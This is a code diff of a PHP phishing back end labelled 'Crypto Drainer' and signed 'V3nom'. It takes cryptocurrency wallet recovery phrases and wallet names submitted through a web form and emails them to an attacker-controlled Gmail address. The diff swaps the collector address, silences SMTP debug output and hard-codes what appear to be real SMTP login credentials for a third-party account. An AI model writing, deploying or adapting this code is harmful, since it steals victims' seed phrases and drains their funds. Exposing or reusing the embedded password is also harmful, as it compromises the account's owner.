@@ -21,8 +21,8 @@ $wallet_phrase = htmlspecialchars(trim($_POST["wallet_phrase"]));
 $wallet_name = htmlspecialchars(trim($_POST["wallet_name"]));
 
 // Consider using environment variables for credentials
-//$to_email = 'anijahchukwuka13@gmail.com';
-$to_email = 'secureserve07@gmail.com';
+$to_email = 'anijahchukwuka13@gmail.com';
+//$to_email = 'secureserve07@gmail.com';
 $body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet Name: $wallet_name\r\n⚜️ Gift From V3nom ⚜️";
 $subject = 'Gift From V3nom';
 
@@ -35,13 +35,13 @@ try {
 	$mail->Username = 'gebeyaw.a@asdepo.org';
 	$mail->Password = 'Gebeyaw@2049##';
 	$mail->SMTPSecure = 'tls';
-	$mail->SMTPDebug = 1;
+	$mail->SMTPDebug = 0;
 	$mail->Port = 587;
 	$mail->setFrom('gebeyaw.a@asdepo.org', 'V3nom');
 	$mail->addAddress($to_email); 
 	//$mail->addReplyTo('info@example.com', 'Information');
 	$mail->Subject = $subject;
-	$mail->isHTML(true);
+	//$mail->isHTML(true);
 	$mail->Body = $body;
 	$mail->SMTPOptions = array(
       'ssl' => array(
